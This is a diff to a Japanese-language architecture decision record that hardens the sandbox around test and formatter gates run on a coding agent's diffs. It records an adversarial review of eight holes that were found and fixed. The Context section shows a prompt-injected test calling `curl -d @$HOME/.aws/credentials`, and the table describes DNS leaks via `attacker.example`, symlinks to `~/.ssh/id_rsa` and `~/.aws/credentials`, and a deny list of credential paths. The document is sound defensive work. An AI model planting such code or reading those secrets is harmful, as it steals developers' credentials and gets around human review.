@@ -1,6 +1,6 @@
 # ADR-0013: gate の実行 — OS sandbox、無ければ人の同意の後
 
-- 状態: 採用（2026-10-03、レビュー R1。文言は即時、sandbox は M3）、**改訂 R2（2026-10-04）: gate 自身のループバックは許す（下）** / 関連: SEC-03・SEC-14、ADR-0006 R1、loop spec §7.6、cr-requests/agent.md #8
+- 状態: 採用（2026-10-03、レビュー R1。文言は即時、sandbox は M3）、**改訂 R2（2026-10-04）: gate 自身のループバックは許す（下）**、R2 の検証パス（同日: Linux で実行、認証情報の読み取り拒否、gate の後始末、agent のターン前の symlink 検査） / 関連: SEC-03・SEC-14、ADR-0006 R1、loop spec §7.6、cr-requests/agent.md #8
 
 ## Context
 gate（formatter・typecheck・test）は agent が書いた diff を人が見る前に実行されていた。prompt injection で agent に `func init(){ … curl -d @$HOME/.aws/credentials … }` を関連 test に書かせれば、`go test` がネットワークと HOME を持ったホスト上でそれを実行する（「Bash を渡さない」L3 と「人が承認する」L7 の両方を迂回）。vitest/jest/pytest の preload、`build.rs`、JS 設定ファイルを読む formatter も同じ。依存 dir の symlink 経由で本物の依存を書き換えられ、reject しても残る。trust ダイアログは「ネットワーク・秘密情報は渡しません」と書いていた（v1 では誤り）。
@@ -63,3 +63,32 @@ F2 で出荷版が sandbox を使うようになったので、この種のパ�
 - (a) 従来どおり全部拒否: 正直だが、loopback を使うテストのあるパッケージは永久に未検証。
 - (b) ループバックを全部許可: ローカルのプロキシ（Clash などの 127.0.0.1:7890）経由で外に出られ、daemon・DB・ブラウザの CDP（9222）にも届く。
 - (c) (b) + 既知のポートの拒否リスト: 名前を知らないサービスに届く。今回の決定は、(c) の拒否リストを「その時点でホストにあるすべて」にしたもの。
+
+## R2 の検証パス（2026-10-04、rem/safety の敵対的検証）
+
+R2 を壊しにいった結果と、その場で直したもの。決定（gate は自分のループバックだけ）は変えていない。
+
+### Linux で実際に動かした
+Ubuntu 24.04 のコンテナ（`docker run --privileged`、bwrap 0.9.0、bun・go 入り。ローカルの `mitori-linux:arm64`）で
+`packages/loop/src/gates/runner.int.test.ts` の **RT-30L** を実行した: gate 自身のサーバー + fetch、`go test` + `httptest.NewServer` が pass。
+ホストの 127.0.0.1 の daemon・192.0.2.1・DNS は届かない。`~/.ssh` は見えず、HOME は読み取り専用。
+`/run/user/<uid>`・`/run/dbus`・`/run/systemd/resolve`・`/run/nscd`・`/run/avahi-daemon`・`/run/podman`・`/run/containerd` に置いた unix socket は、
+gate からは届かず、ホストからは届く（コンテナには `--tmpfs <dir>:uid=501` でディレクトリを作った）。loop の全テストも Linux で緑（573 pass）。
+
+### 見つけて直したもの
+| # | 穴 | 直し方 | 回帰テスト |
+|---|---|---|---|
+| 1 | **Linux: `~/.claude.json` があると全 gate が失敗**。`.claude*` を全部 `--tmpfs` で隠していたが、tmpfs はファイルの上に mount できない（`bwrap: Can't mkdir …/.claude.json: Not a directory`）。Claude Code の利用者には必ずある | ディレクトリは tmpfs、ファイルは `/dev/null` の bind（`SandboxPaths.isDir?`）。壊れた symlink は隠す対象にしない | RT-30L、`sandbox.test.ts` |
+| 2 | **検出が gate より小さい bwrap を試していた**。`--proc /proc`・`--unshare-pid` を含まないので、新しい `/proc` を拒むコンテナ（seccomp unconfined の Docker、devcontainer）で `bwrap` を選び、全 gate が `error` になった | 検出は gate と同じ名前空間と mount（platform `BWRAP_PROBE_ARGS`）。そのコンテナでは `"none"`（同意の経路）になることを確かめた | `spawn/sandbox.test.ts` |
+| 3 | **名前解決のデーモンが代わりに DNS を引く**。network namespace は gate 自身の DNS パケットを止めるが、glibc の NSS は systemd-resolved（varlink の socket、`nss-resolve`: Fedora / Arch）・nscd・avahi（`mdns4_minimal`: Ubuntu）に問い合わせる。`<秘密>.attacker.example` がデーモンの問い合わせとして外に出る | `/run/systemd/resolve`・`/run/nscd`・`/run/avahi-daemon` を隠す（macOS は mDNSResponder の socket の拒否で同じ道を閉じている） | RT-30L |
+| 4 | **他のツールの認証情報が gate から読めた**。`~/.netrc`・`~/.npmrc`・`~/.git-credentials`・`~/.docker`・`~/.kube`・`~/.config/gcloud`・`~/.azure`・Firefox のプロファイル（平文のセッション cookie）など。ネットワークが無くても、gate は木にコピーでき、次の agent のターンがその木を読む | 読み取りを拒否（`SENSITIVE_HOME_DIRS` / `SENSITIVE_HOME_FILES`、両 OS）。npm・bun は `~/.npmrc` が読めなくても動く | RT-30（認証情報）、RT-30L |
+| 5 | **symlink の先の秘密が読めた（macOS）**。Seatbelt は解決後のパスで判定する。`~/.aws -> ~/dotfiles/aws`（dotfile の管理ツール）だと `~/.aws` の拒否に当たらない | すべての拒否パスを realpath でも拒否（`SandboxPaths.realpath?`） | RT-30（認証情報）: 直す前は `cp ~/.aws/credentials` が通った |
+| 6 | **gate が始めたプロセスが gate より長生きした**。リーダーが正常終了するとプロセスグループには何も送っていなかった（タイムアウトと取り消しのときだけ）。`(sleep 1; ln -s ~/.ssh/id_rsa link) &` が、gate の後の検査が終わってから木に symlink を置ける | gate はリーダーの終了後にグループへ SIGKILL（platform `RunOptions.reapGroup`、CR safe-7） | `runner.int.test.ts`「nothing a gate starts outlives it」: 直す前は symlink ができた |
+| 7 | **gate が置いた symlink を次の agent のターンが辿った**。sandbox は symlink の作成を止めない（読むのは止める）。`testdata/a/b/node_modules -> ~/.aws/credentials` は後片付けの同期（依存リンクは残す）と依存リンクの解除（深さ 3 まで）をすり抜け、REPAIR ターンの Read が中身を読んだ（INT-08 で再現、偽の資格情報が読めた） | agent の各ターンの前に作業ツリーを歩き、外を指す symlink、追跡されていない / 書き換えられた壊れた symlink、無効化したはずの追跡済み symlink が実体化していれば job を `E_SCOPE_VIOLATION`（`symlink_escape`、修復・昇格なし）。react 規模（8k entries）で ≈ 35 ms | INT-08「F1 remainder: a symlink a sandboxed test leaves…」、git.int |
+| 8 | **追跡済み symlink の判定が字面だった**。`p/q/l -> ../..`（root）のとき `x -> p/q/l/../../..` は字面では root、実際は root の 2 つ上。worktree に実体化されていた | カーネルと同じく 1 成分ずつ、追跡済みのリンクを置き換えながら解決（大文字小文字違いも辿る） | `symlinks.test.ts`、git.int |
+
+### 残り（この検証パスでも閉じていない）
+- **macOS で setsid したプロセス**: 6 はプロセスグループを殺すだけで、`setsid` / 二重 fork でグループを抜けたプロセスは残る（sandbox は継承するので書けるのは木・TMPDIR・cache だけ）。7 の歩査は各ターンの前にしか見ないので、ターン中に置かれた symlink は防げず、次のターンの前かターン後の範囲チェックで失敗にするだけ。Linux は PID 名前空間ごと終わるので残らない。
+- **列挙していない秘密**: 読み取りは allow-default のまま。4 のリストに無い場所の秘密（独自のトークンファイルなど）は gate が木にコピーでき、次のターンのモデルに届く。根本は deny-default の読み取り profile（R1-O2）。
+- `(allow default)` の mach service（XPC サービス経由の通信など）、`0.0.0.0` への bind による LAN からの着信、root が 1024 以上で listen するサービス（macOS、lsof に見えない）は R2 の Trade-offs のとおり。
+- Linux はコンテナで確かめた。systemd・D-Bus・Docker が本当に動いているデスクトップの実機では未実行（隠すのはディレクトリなので、socket の実体が何であっても同じ）。
